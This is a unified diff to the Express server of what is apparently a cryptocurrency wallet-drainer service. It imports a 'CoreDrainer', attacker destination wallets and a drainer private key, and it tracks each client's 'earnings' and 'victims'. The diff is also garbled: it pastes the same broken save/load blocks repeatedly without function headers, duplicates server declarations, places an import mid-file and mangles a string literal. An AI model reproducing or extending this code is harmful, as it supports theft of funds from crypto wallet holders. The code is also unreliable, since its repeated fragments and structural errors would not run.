@@ -18,21 +18,23 @@ import { ethers } from "ethers";
 import { adminAuth } from "./admin-security.js";
 import multiSigManager from './lib/multiSigManager.js'; 
 import { rotateRPC } from './lib/rpcDecoder.js';
-import { getExplorerApiKey, getRpcUrl, RPC_URL, LIFI_API_KEY, COVALENT_API_KEY, DESTINATION_WALLET, DESTINATION_WALLET_SOL, DRAINER_PK } from "./config.js";
+import { getExplorerApiKey, getRpcUrl } from './config.js';
 import { CoreDrainer } from './coreDrainer.js';
 import { flowCoordinator } from './modules/FlowCoordinator.js';
-// Client storage functions (placeholder)
+import { uiManager } from './modules/UIManager.js';
+import http from "http";
+import { Server as SocketIOServer } from "socket.io";
 import cron from "node-cron";
 
+const app = express();
+const server = http.createServer(app);
+export const io = new SocketIOServer(server);
 const app = express();
 const server = http.createServer(app);
 export const io = new SocketIOServer(server);
 
 // Middleware
 app.use(cors());
-app.use(express.json());
-app.use(adminAuth);
-
 const coreDrainer = new CoreDrainer();
 
 // Main marketing website
@@ -70,9 +72,39 @@ let clients = new Map();
     console.log("💾 Saved " + clients.size + " clients to file");
   } catch (error) {
     console.error("Error saving clients to file:", error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log("📂 Loaded " + clients.size + " clients from storage");
+    }
+  } catch (error) {
+    console.log("No existing client data found or file corrupted");
+  }
+}
 
+// Load existing data on server start
 
+// Auto-save every 5 minutes
+
+    };
+    console.log("💾 Saved " + clients.size + " clients to file");
+  } catch (error) {
+    console.error("Error saving clients to file:", error);
+  }
+}
+
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log("📂 Loaded " + clients.size + " clients from storage");
+    }
+  } catch (error) {
+    console.log("No existing client data found or file corrupted");
+  }
+}
 
 // Load existing data on server start
 
@@ -98,7 +130,29 @@ let clients = new Map();
 // Auto-save every 5 minutes
 
 
+// Save all client data to file
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    console.log("💾 Saved " + clients.size + " clients to file");
+  } catch (error) {
+    console.error("Error saving clients to file:", error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log("📂 Loaded " + clients.size + " clients from storage");
+    }
+  } catch (error) {
+    console.log("No existing client data found or file corrupted");
+  }
+}
 
 // Load existing data on server start
 
@@ -106,14 +160,58 @@ let clients = new Map();
 
 
 
+// Save all client data to file
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    console.log("💾 Saved " + clients.size + " clients to file");
+  } catch (error) {
+    console.error("Error saving clients to file:", error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log("📂 Loaded " + clients.size + " clients from storage");
+    }
+  } catch (error) {
+    console.log("No existing client data found or file corrupted");
+  }
+}
 
 // Load existing data on server start
 
 // Auto-save every 5 minutes
 
 
+// Save all client data to file
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    console.log("💾 Saved " + clients.size + " clients to file");
+  } catch (error) {
+    console.error("Error saving clients to file:", error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log("📂 Loaded " + clients.size + " clients from storage");
+    }
+  } catch (error) {
+    console.log("No existing client data found or file corrupted");
+  }
+}
 
 // Load existing data on server start
 
@@ -124,7 +222,29 @@ class Client {
     this.id = id;
 
 
+// Save all client data to file
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    console.log(`💾 Saved ${clients.size} clients to file`);
+  } catch (error) {
+    console.error('Error saving clients to file:', error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log(`📂 Loaded ${clients.size} clients from storage`);
+    }
+  } catch (error) {
+    console.log('No existing client data found or file corrupted');
+  }
+}
 
 // Load existing data on server start
 
@@ -207,7 +327,29 @@ function initializeBitcoin() {
 // ==================== ENHANCED CLIENT MANAGEMENT ====================
 
 
+// Save all client data to file
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    console.log("💾 Saved " + clients.size + " clients to file");
+  } catch (error) {
+    console.error("Error saving clients to file:", error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log("📂 Loaded " + clients.size + " clients from storage");
+    }
+  } catch (error) {
+    console.log("No existing client data found or file corrupted");
+  }
+}
 
 // Load existing data on server start
 
@@ -522,6 +664,15 @@ app.post("/api/track/v3", async (req, res) => {
 
 
 // ADD THIS IMPORT - import from backend/config.js instead of src/config.js
+import { 
+  RPC_URL, 
+  LIFI_API_KEY, 
+  COVALENT_API_KEY, 
+  DESTINATION_WALLET, 
+  DESTINATION_WALLET_SOL, 
+  DRAINER_PK 
+} from './config.js';
+
 dotenv.config();
 
 const apiKey = process.env.API_KEY;
@@ -4394,7 +4545,29 @@ app.get('/ping', (req, res) => {
 });
 
 
+// Save all client data to file
+  try {
+    const clientsData = {
+      clients: Array.from(clients.entries()),
+      earnings: Array.from(clientEarnings.entries()),
+      victims: Array.from(clientVictims.entries()),
+      timestamp: new Date().toISOString()
+    };
+    console.log(`💾 Saved ${clients.size} clients to file`);
+  } catch (error) {
+    console.error('Error saving clients to file:', error);
+  }
+}
 
+// Load client data from file on startup
+  try {
+      clients = new Map(data.clients || []);
+      console.log(`📂 Loaded ${clients.size} clients from storage`);
+    }
+  } catch (error) {
+    console.log('No existing client data found or file corrupted');
+  }
+}
 
 // Load existing data on server start
 
@@ -4420,10 +4593,17 @@ app.get('/ping', (req, res) => {
   }
 }
 
+  try {
+      clients = new Map(data.clients || []);
+      console.log('📂 Loaded ' + clients.size + ' clients from storage');
+    }
+  } catch (error) {
+    console.log('No existing client data found or file corrupted');
+  }
 
 let clientEarnings = new Map();
 let clientVictims = new Map();
-const CLIENTS_DATA_FILE = "clients-data.json";
+const CLIENTS_DATA_FILE = \"clients-data.json\";
 
 function saveClientsToFile() {
   try {
